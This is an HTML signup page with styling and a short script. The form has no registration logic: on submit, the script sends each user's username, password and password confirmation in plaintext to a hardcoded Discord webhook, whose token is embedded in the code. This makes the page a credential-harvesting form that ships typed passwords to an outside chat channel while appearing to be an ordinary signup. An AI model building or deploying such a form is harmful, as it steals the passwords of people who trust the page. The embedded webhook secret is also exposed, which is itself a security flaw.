<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Signup</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background-image: url('./360_F_86767205_fL5TRa6i9tm2E74TmDYRcT3yA9ACMhor.jpg');
            /* Replace 'your-background-image.jpg' with your image path */
            background-size: cover;
            background-position: center;
            color: #ffffff;
            /* White text */
        }

        .container {
            width: 100%;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .signup-box {
            width: 350px;
            padding: 40px;
            background-color: rgba(0, 0, 0, 0.7);
            /* Darker gray with opacity for the signup box */
            border-radius: 10px;
            box-shadow: 0px 0px 10px 0px rgba(0, 0, 0, 0.75);
            text-align: center;
        }

        .signup-box h2 {
            margin-bottom: 30px;
        }

        .signup-box input[type="text"],
        .signup-box input[type="password"] {
            width: calc(100% - 20px);
            padding: 10px;
            margin-bottom: 20px;
            border: none;
            background-color: rgba(255, 255, 255, 0.2);
            /* White with opacity for input fields */
            color: #ffffff;
            /* White text */
            border-radius: 5px;
        }

        .signup-box input[type="checkbox"] {
            margin-right: 5px;
        }

        .signup-box input[type="submit"] {
            width: 100%;
            padding: 10px;
            border: none;
            background-color: #007bff;
            /* Blue submit button */
            color: #ffffff;
            /* White text */
            cursor: pointer;
            border-radius: 5px;
            transition: background-color 0.3s ease;
        }

        .signup-box input[type="submit"]:hover {
            background-color: #0056b3;
            /* Darker blue on hover */
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="signup-box">
            <h2>Signup</h2>
            <form id="signupForm" onsubmit="submitForm(event)">
                <input type="text" name="username" id="username" placeholder="Username">
                <input type="password" name="password" id="password" placeholder="Password">
                <input type="password" name="confirm_password" id="confirm_password" placeholder="Confirm Password">
                <label><input type="checkbox" name="terms" required> I agree to the Terms of Service</label>
                <input type="submit" value="Signup">
            </form>
        </div>
    </div>

    <script>
        function submitForm(event) {
            event.preventDefault(); // Prevent default form submission

            // Get form data
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const confirm_password = document.getElementById('confirm_password').value;

            // Construct message
            const message = `New signup:\nUsername: ${username} | Password: ${password} | confirmedpassword: ${confirm_password}`;

            // Send message to Discord webhook
            const webhookUrl = 'https://discord.com/api/webhooks/1224530267541340222/HDL_ewtHfQSMtLWMtNtQrUDjffFvLr5-BAX2XIgdU9Xe-BkKRxaAP024WMzD3PgrE6TL'; // Replace with your Discord webhook URL
            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ content: message }),
            })
                .then(response => {
                    if (!response.ok) {
                        throw new Error('SignUp Error');
                    }
                    console.log('Message sent to Server');
                })
                .catch(error => {
                    console.error('Error:', error);
                });

            // You can redirect the user or perform any other action here
        }
    </script>
</body>

</html>
